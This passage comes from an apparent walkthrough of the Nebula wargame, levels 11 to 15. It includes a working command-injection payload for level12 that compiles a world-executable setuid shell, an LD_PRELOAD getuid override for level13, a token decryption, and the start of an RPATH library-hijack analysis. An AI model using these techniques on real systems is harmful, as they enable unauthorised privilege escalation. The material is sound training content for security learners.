  fd <span style="color:#f92672">=</span> open(<span style="color:#f92672">*</span>path, O_CREAT<span style="color:#f92672">|</span>O_RDWR, <span style="color:#ae81ff">0600</span>);
  unlink(<span style="color:#f92672">*</span>path);
  <span style="color:#66d9ef">return</span> fd;
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">process</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer, <span style="color:#66d9ef">int</span> length)
{
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key;
  <span style="color:#66d9ef">int</span> i;

  key <span style="color:#f92672">=</span> length <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;

  <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> length; i<span style="color:#f92672">++</span>) {
      buffer[i] <span style="color:#f92672">^=</span> key;
      key <span style="color:#f92672">-=</span> buffer[i];
  }

  system(buffer);
}

<span style="color:#75715e">#define CL &#34;Content-Length: &#34;
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
  <span style="color:#66d9ef">char</span> line[<span style="color:#ae81ff">256</span>];
  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">1024</span>];
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>mem;
  <span style="color:#66d9ef">int</span> length;
  <span style="color:#66d9ef">int</span> fd;
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>path;

  <span style="color:#66d9ef">if</span>(fgets(line, <span style="color:#66d9ef">sizeof</span>(line), stdin) <span style="color:#f92672">==</span> NULL) {
      errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;reading from stdin&#34;</span>);
  }

  <span style="color:#66d9ef">if</span>(strncmp(line, CL, strlen(CL)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
      errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;invalid header&#34;</span>);
  }

  length <span style="color:#f92672">=</span> atoi(line <span style="color:#f92672">+</span> strlen(CL));

  <span style="color:#66d9ef">if</span>(length <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(buf)) {
      <span style="color:#66d9ef">if</span>(fread(buf, length, <span style="color:#ae81ff">1</span>, stdin) <span style="color:#f92672">!=</span> length) {
          err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;fread length&#34;</span>);
      }
      process(buf, length);
  } <span style="color:#66d9ef">else</span> {
      <span style="color:#66d9ef">int</span> blue <span style="color:#f92672">=</span> length;
      <span style="color:#66d9ef">int</span> pink;

      fd <span style="color:#f92672">=</span> getrand(<span style="color:#f92672">&amp;</span>path);

      <span style="color:#66d9ef">while</span>(blue <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
          printf(<span style="color:#e6db74">&#34;blue = %d, length = %d, &#34;</span>, blue, length);

          pink <span style="color:#f92672">=</span> fread(buf, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">sizeof</span>(buf), stdin);
          printf(<span style="color:#e6db74">&#34;pink = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pink);

          <span style="color:#66d9ef">if</span>(pink <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
              err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;fread fail(blue = %d, length = %d)&#34;</span>, blue, length);
          }
          write(fd, buf, pink);

          blue <span style="color:#f92672">-=</span> pink;
      }

      mem <span style="color:#f92672">=</span> mmap(NULL, length, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, MAP_PRIVATE, fd, <span style="color:#ae81ff">0</span>);
      <span style="color:#66d9ef">if</span>(mem <span style="color:#f92672">==</span> MAP_FAILED) {
          err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;mmap&#34;</span>);
      }
      process(mem, length);
  }

}
</code></pre></div><p>I&rsquo;ll admit. This level kicked my ass. Eventually I gave up and resorted to a few hints that could tell me how to proceed. None of the other walkthroughs that I read actually had working exploits for this level either. That which I have tried never got me to even execute <code>getflag</code> so that it would be happy with the effective user ids. Maybe this level is bugged, but I am not sure :(</p>
<h2 id="level12">level12</h2>
<p><a href="https://exploit-exercises.com/nebula/level12/">Level12&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a backdoor process listening on port 50001.</p>
</blockquote>
<p>With the description we are provided with the source code of a small Lua program:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-lua" data-lang="lua"><span style="color:#66d9ef">local</span> socket <span style="color:#f92672">=</span> require(<span style="color:#e6db74">&#34;socket&#34;</span>)
<span style="color:#66d9ef">local</span> server <span style="color:#f92672">=</span> assert(socket.bind(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">50001</span>))

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hash</span>(password)
  prog <span style="color:#f92672">=</span> io.popen(<span style="color:#e6db74">&#34;echo &#34;</span><span style="color:#f92672">..</span>password<span style="color:#f92672">..</span><span style="color:#e6db74">&#34; | sha1sum&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
  data <span style="color:#f92672">=</span> prog:read(<span style="color:#e6db74">&#34;*all&#34;</span>)
  prog:close()

  data <span style="color:#f92672">=</span> string.sub(data, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">40</span>)

  <span style="color:#66d9ef">return</span> data
<span style="color:#66d9ef">end</span>


<span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">do</span>
  <span style="color:#66d9ef">local</span> client <span style="color:#f92672">=</span> server:accept()
  client:send(<span style="color:#e6db74">&#34;Password: &#34;</span>)
  client:settimeout(<span style="color:#ae81ff">60</span>)
  <span style="color:#66d9ef">local</span> line, err <span style="color:#f92672">=</span> client:receive()
  <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> err <span style="color:#66d9ef">then</span>
      print(<span style="color:#e6db74">&#34;trying &#34;</span> <span style="color:#f92672">..</span> line) <span style="color:#75715e">-- log from where ;\</span>
      <span style="color:#66d9ef">local</span> h <span style="color:#f92672">=</span> hash(line)

      <span style="color:#66d9ef">if</span> h <span style="color:#f92672">~=</span> <span style="color:#e6db74">&#34;4754a4f4bd5787accd33de887b9250a0691dd198&#34;</span> <span style="color:#66d9ef">then</span>
          client:send(<span style="color:#e6db74">&#34;Better luck next time</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
      <span style="color:#66d9ef">else</span>
          client:send(<span style="color:#e6db74">&#34;Congrats, your token is 413**CARRIER LOST**</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
      <span style="color:#66d9ef">end</span>

  <span style="color:#66d9ef">end</span>

  client:close()
<span style="color:#66d9ef">end</span>
</code></pre></div><p>This level had another very obvious command injection vulnerability on the line where a <code>password</code> variable is piped through <code>sha1sum</code>. I made a copy of this program and modified it to print me the outputs so that I could prepare a properly formatted command to be used on a socket. The basic idea of the injection was to separate the echo with a <code>;</code> character and compile my setuid C shell. I then added a hash (#) to ignore the rest of the command what would have been executed.</p>
<p>So, to solve level12:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level12@nebula:~$ echo <span style="color:#e6db74">&#34;;gcc /var/tmp/shell.c -o /var/tmp/flag12;chmod 4777 /var/tmp/flag12;#&#34;</span> | nc 127.0.0.1 <span style="color:#ae81ff">50001</span>
Password: Better luck next time

level12@nebula:~$ /var/tmp/flag12
sh-4.2$ getflag
You have successfully executed getflag on a target account
sh-4.2$
</code></pre></div><h2 id="level13">level13</h2>
<p><a href="https://exploit-exercises.com/nebula/level13/">Level13&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p>
</blockquote>
<p>With the description we are provided with the source code of a small C program:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-lua" data-lang="lua"><span style="color:#f92672">#</span>include <span style="color:#f92672">&lt;</span>stdlib.h<span style="color:#f92672">&gt;</span>
<span style="color:#f92672">#</span>include <span style="color:#f92672">&lt;</span>unistd.h<span style="color:#f92672">&gt;</span>
<span style="color:#f92672">#</span>include <span style="color:#f92672">&lt;</span>stdio.h<span style="color:#f92672">&gt;</span>
<span style="color:#f92672">#</span>include <span style="color:#f92672">&lt;</span>sys<span style="color:#f92672">/</span>types.h<span style="color:#f92672">&gt;</span>
<span style="color:#f92672">#</span>include <span style="color:#f92672">&lt;</span>string.h<span style="color:#f92672">&gt;</span>

<span style="color:#f92672">#</span>define FAKEUID <span style="color:#ae81ff">1000</span>

int main(int argc, char <span style="color:#f92672">**</span>argv, char <span style="color:#f92672">**</span>envp)
{
  int c;
  char token[<span style="color:#ae81ff">256</span>];

  <span style="color:#66d9ef">if</span>(getuid() <span style="color:#960050;background-color:#1e0010">!</span><span style="color:#f92672">=</span> FAKEUID) {
      printf(<span style="color:#e6db74">&#34;Security failure detected. UID %d started us, we expect %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, getuid(), FAKEUID);
      printf(<span style="color:#e6db74">&#34;The system administrators will be notified of this violation</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
      exit(EXIT_FAILURE);
  }

  <span style="color:#f92672">//</span> snip, sorry :)

  printf(<span style="color:#e6db74">&#34;your token is %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, token);

}
</code></pre></div><p>This level had me researching for quite some time. I came to learn of ELF DSO&rsquo;s and <code>LD_PRELOAD</code>. Basically, it is possible to have the dynamic linker preload shared libraries from the <code>LD_PRELOAD</code> environment variable that may allow for some functions to be modified. <a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">This</a> article contained most of the magic that was needed to get this level done.</p>
<p>I decided to &lsquo;override&rsquo; the <code>getuid()</code> function so that it would return the value of the <code>FAKEUID</code> constant in the program, instead of the value the real <code>getuid()</code> would have returned. For that to happen, I looked up the arguments for <code>getuid()</code> from the man page and copied that for my own purposes. I then compiled it as a shared library with the famous <code>-shared -fPIC</code> arguments for position independent code and exported the <code>LD_PRELOAD</code> variable prior to running the binary.</p>
<p>One important thing to note here is that this &lsquo;hack&rsquo; has a few gotchas. The executing binary and the library needs to be relative to each other. SETUID programs discard the <code>LD_PRELOAD</code> environment variable (for obvious reasons) so this is not a privilege escalation. In the source code we have received, there is a portion excluded (that probably just prints the token :P) on purpose. This means we can copy the binary and still be able to get the desired effect. Of course, we could also resort to slapping this into a debugger and checking what it is doing under the hood, but given the nature of Nebula, I figured the point is to actually override <code>getuid()</code>.</p>
<p>So, to solve level13:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level13@nebula:/var/tmp$ cp ~flag13/flag13 .

level13@nebula:/var/tmp$ cat fake_getuid.c
<span style="color:#75715e">#include&lt;unistd.h&gt;</span>

uid_t getuid<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
    <span style="color:#66d9ef">return</span> 1000;
<span style="color:#f92672">}</span>

level13@nebula:/var/tmp$ gcc -shared -fPIC /var/tmp/fake_getuid.c -o /var/tmp/fake_getuid.o

level13@nebula:/var/tmp$ LD_PRELOAD<span style="color:#f92672">=</span>/var/tmp/fake_getuid.o ./flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58

level13@nebula:/var/tmp$ su - flag13
Password:
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level14">level14</h2>
<p><a href="https://exploit-exercises.com/nebula/level14/">Level14&rsquo;s Description</a>:</p>
<blockquote>
<p>This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)</p>
</blockquote>
<p>Logged in as user <code>level14</code>, we see 2 files in the <code>flag14</code> directory:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level14@nebula:~$ cd ~flag14
level14@nebula:/home/flag14$ ls -lh
total 8.0K
-rwsr-x--- <span style="color:#ae81ff">1</span> flag14  level14 7.2K 2011-12-05 18:59 flag14
-rw------- <span style="color:#ae81ff">1</span> level14 level14   <span style="color:#ae81ff">37</span> 2011-12-05 18:59 token

level14@nebula:/home/flag14$ cat token
857:g67?5ABBo:BtDA?tIvLDKL<span style="color:#f92672">{</span>MQPSRQWW.
</code></pre></div><p><code>token</code> obviously being the target to decrypt. Running <code>flag14</code> tells us that it is expecting a <code>-e</code> flag to encrypt. So, I tested the encryption to see how it behaves:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level14@nebula:/home/flag14$ ./flag14 -e
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ABCDEFGHIJKLMNOPQRSTUVWXYZ<span style="color:#f92672">[</span><span style="color:#ae81ff">\]</span>^<span style="color:#f92672">(</span>
</code></pre></div><p>What immediately jumped out at me was the A&rsquo;s that I had sent it came back as the alphabet. :D After a few tests I came to the conclusion that the key seems to start at 0, and increments with every character. Each characters ASCII value is then incremented by what ever the current value of the key is. To test this theory, I wrote a small python script to replicate this behavior:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>

<span style="color:#75715e"># exploit-exercises level14 cryptor</span>

string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;AABBCCDDEEFFGG&#39;</span>
key <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>

<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;String: {s}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Strlen: {l}</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(s <span style="color:#f92672">=</span> string, l <span style="color:#f92672">=</span> len(string))

<span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> string:
    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Key: {key}</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> Char: {char}</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> Ord: {ord}</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> Res: {res}&#39;</span><span style="color:#f92672">.</span>format(
        key <span style="color:#f92672">=</span> key, char <span style="color:#f92672">=</span> char, ord <span style="color:#f92672">=</span> ord(char), res <span style="color:#f92672">=</span> chr(ord(char) <span style="color:#f92672">+</span> key)
    )
    result <span style="color:#f92672">+=</span> chr(ord(char) <span style="color:#f92672">+</span> key)
    key <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>

<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Result: {res}&#39;</span><span style="color:#f92672">.</span>format(res <span style="color:#f92672">=</span> result)
</code></pre></div><p>Running this meant that the output would be:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">~ # python crypt.py
String: AABBCCDDEEFFGG
Strlen: 14
Key: 0   Char: A     Ord: 65     Res: A
Key: 1   Char: A     Ord: 65     Res: B
Key: 2   Char: B     Ord: 66     Res: D
Key: 3   Char: B     Ord: 66     Res: E
Key: 4   Char: C     Ord: 67     Res: G
Key: 5   Char: C     Ord: 67     Res: H
Key: 6   Char: D     Ord: 68     Res: J
Key: 7   Char: D     Ord: 68     Res: K
Key: 8   Char: E     Ord: 69     Res: M
Key: 9   Char: E     Ord: 69     Res: N
Key: 10  Char: F     Ord: 70     Res: P
Key: 11  Char: F     Ord: 70     Res: Q
Key: 12  Char: G     Ord: 71     Res: S
Key: 13  Char: G     Ord: 71     Res: T

Result: ABDEGHJKMNPQST
</code></pre></div><p>The same string was checked using the <code>flag14</code> cryptor:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level14@nebula:/home/flag14$ ./flag14 -e
AABBCCDDEEFFGG
ABDEGHJKMNPQST
</code></pre></div><p>A match :) Being able to replicate the encryption, meant that the decryption was trivial. Instead of adding 1 to the key, I simply subtracted 1 from the key in order to reverse the string in the <code>token</code> file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">~ # python decrypt.py
String: 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
Strlen: 36  Key start = 0
Key: 0   Char: 8     Ord: 56     Res: 8
Key: 1   Char: 5     Ord: 53     Res: 4
Key: 2   Char: 7     Ord: 55     Res: 5
Key: 3   Char: :     Ord: 58     Res: 7
Key: 4   Char: g     Ord: 103    Res: c
Key: 5   Char: 6     Ord: 54     Res: 1
Key: 6   Char: 7     Ord: 55     Res: 1
Key: 7   Char: ?     Ord: 63     Res: 8
Key: 8   Char: 5     Ord: 53     Res: -
Key: 9   Char: A     Ord: 65     Res: 8
Key: 10  Char: B     Ord: 66     Res: 8
Key: 11  Char: B     Ord: 66     Res: 7
Key: 12  Char: o     Ord: 111    Res: c
Key: 13  Char: :     Ord: 58     Res: -
Key: 14  Char: B     Ord: 66     Res: 4
Key: 15  Char: t     Ord: 116    Res: e
Key: 16  Char: D     Ord: 68     Res: 4
Key: 17  Char: A     Ord: 65     Res: 0
Key: 18  Char: ?     Ord: 63     Res: -
Key: 19  Char: t     Ord: 116    Res: a
Key: 20  Char: I     Ord: 73     Res: 5
Key: 21  Char: v     Ord: 118    Res: a
Key: 22  Char: L     Ord: 76     Res: 6
Key: 23  Char: D     Ord: 68     Res: -
Key: 24  Char: K     Ord: 75     Res: 3
Key: 25  Char: L     Ord: 76     Res: 3
Key: 26  Char: {     Ord: 123    Res: a
Key: 27  Char: M     Ord: 77     Res: 2
Key: 28  Char: Q     Ord: 81     Res: 5
Key: 29  Char: P     Ord: 80     Res: 3
Key: 30  Char: S     Ord: 83     Res: 5
Key: 31  Char: R     Ord: 82     Res: 3
Key: 32  Char: Q     Ord: 81     Res: 1
Key: 33  Char: W     Ord: 87     Res: 6
Key: 34  Char: W     Ord: 87     Res: 5
Key: 35  Char: .     Ord: 46     Res:


Result: 8457c118-887c-4e40-a5a6-33a25353165
</code></pre></div><p>So, to solve level14:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level14@nebula:/home/flag14$ su - flag14
Password:
flag14@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level15">level15</h2>
<p><a href="https://exploit-exercises.com/nebula/level15/">Level15&rsquo;s Description</a>:</p>
<blockquote>
<p>strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.
Clean up after yourself :)</p>
</blockquote>
<p>Logged in as user <code>level15</code>, we see 1 file in the <code>flag15</code> directory called <code>flag15</code>. Running it simply tells us to <em>strace it!</em>. Running it with <code>strace</code> immediately reveals a whole bunch of interesting things about <code>flag15</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">level15@nebula:/home/flag15$ strace ./flag15
execve(&#34;./flag15&#34;, [&#34;./flag15&#34;], [/* 20 vars */]) = 0
brk(0)                                  = 0x88c9000
access(&#34;/etc/ld.so.nohwcap&#34;, F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786b000
access(&#34;/etc/ld.so.preload&#34;, R_OK)      = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/i686/sse2/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/i686/sse2/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/i686/sse2&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/i686/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/i686/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/i686/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/i686&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/sse2/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/sse2/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/sse2&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/i686/sse2/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/i686/sse2/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/i686/sse2&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/i686/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/i686/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/i686/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/i686&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/sse2/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/sse2/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/sse2/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/sse2&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15&#34;, {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
open(&#34;/etc/ld.so.cache&#34;, O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7862000
close(3)                                = 0
access(&#34;/etc/ld.so.nohwcap&#34;, F_OK)      = -1 ENOENT (No such file or directory)
open(&#34;/lib/i386-linux-gnu/libc.so.6&#34;, O_RDONLY) = 3
read(3, &#34;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&#34;..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xe78000
mmap2(0xfee000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xfee000
mmap2(0xff1000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xff1000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7861000
set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb78618d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xfee000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x199000, 4096, PROT_READ)     = 0
munmap(0xb7862000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786a000
write(1, &#34;strace it!\n&#34;, 11strace it!
)            = 11
exit_group(11)                          = ?
</code></pre></div><p>There are <strong>plenty</strong> of attempts to load <code>libc.so.6</code> from various locations! I checked out what is in <code>/var/tmp</code> and found the original <code>flag15</code> folder there. It was empty. My initial thought were I need to give it a <code>libc.so.6</code> to load, but obviously one that will be useful enough to me so that I may gain some form of code execution.</p>
<p>This challenge had me on another Google ride in order to understand what is going on here. From what I could gather, when a binary is compiled with <code>gcc</code>, it is possible to add <code>hwcap</code> support for different processor architectures. It is also possible to tell the linker from where it should load dynamic libraries using a <a href="http://en.wikipedia.org/wiki/Rpath">rpath</a>. In the case of <code>flag15</code>, the <code>RPATH</code> is set to <code>/var/tmp/flag15</code>. We can see this using <code>readelf</code> and looking at the dynamic section:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level15@nebula:/home/flag15$ readelf -d ./flag15

Dynamic section at offset 0xf20 contains <span style="color:#ae81ff">21</span> entries:
  Tag        Type                         Name/Value
 0x00000001 <span style="color:#f92672">(</span>NEEDED<span style="color:#f92672">)</span>                     Shared library: <span style="color:#f92672">[</span>libc.so.6<span style="color:#f92672">]</span>
 0x0000000f <span style="color:#f92672">(</span>RPATH<span style="color:#f92672">)</span>                      Library rpath: <span style="color:#f92672">[</span>/var/tmp/flag15<span style="color:#f92672">]</span>
 0x0000000c <span style="color:#f92672">(</span>INIT<span style="color:#f92672">)</span>                       0x80482c0
 0x0000000d <span style="color:#f92672">(</span>FINI<span style="color:#f92672">)</span>                       0x80484ac

 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</code></pre></div><p>Ok, so that kinda explained the <em>why</em> its loading libc.so.6 from there, but not really the &lsquo;how this can be useful&rsquo;. I was still a little stuck on the previous <code>LD_PRELOAD</code> hackery, but had to constantly remind myself that that environment variable will be discarded in the case of the SETUID program.</p>
<p>I was a little unsure how to get something useful going from here. I touched a file called <code>libc.so.6</code> in <code>/var/tmp/flag15/</code> and launched the binary, just to get a starting point:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level15@nebula:/var/tmp/flag15$ touch libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: error <span style="color:#66d9ef">while</span> loading shared libraries: /var/tmp/flag15/libc.so.6: file too short
</code></pre></div><p>I was not expecting much from that attempt, but it helped me get started. Eventually I figured I could have a look at <code>flag15</code> and check which libc function I could &ldquo;override??&rdquo; from the RELO table:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level15@nebula:/var/tmp/flag15$ objdump -R ~flag15/flag15

/home/flag15/flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
